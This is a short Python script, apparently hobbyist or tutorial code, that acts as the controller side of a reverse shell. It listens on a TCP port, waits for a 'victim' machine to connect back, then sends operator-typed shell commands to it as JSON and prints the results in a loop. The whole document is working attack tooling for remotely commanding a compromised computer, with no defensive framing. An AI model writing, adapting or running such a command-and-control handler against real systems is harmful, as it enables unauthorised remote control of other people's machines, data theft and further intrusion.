#!/usr/bin/python3
import socket
import json

Hostip="127.0.0.1"
Hostport=12345

def reliable_send(data):
    json_data = json.dumps(data)
    target.send(bytes(json_data,encoding="utf-8"))

def reliable_recv():
    json_data=bytearray(0)
    while True:
        try:
            json_data += target.recv(1024)
            return json.loads(json_data)
        except ValueError:
            continue   

# Establish Socket
s= socket.socket(socket.AF_INET, socket.SOCK_STREAM) # ipv4 / tcp
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)

# Bind Address
s.bind((Hostip, Hostport))

# Service Start
s.listen()
print("Server Started.")
target,ip =s.accept()
print("Victim connect!")

# Communication
while True:
    command=input("* Shell#-%s: " % str(ip))
    # target.send(command.encode())
    reliable_send(command)
    if command =='q': break
    else:
        # result=target.recv(1024)
        result = reliable_recv()
        print(result)

# Disconnect
s.close()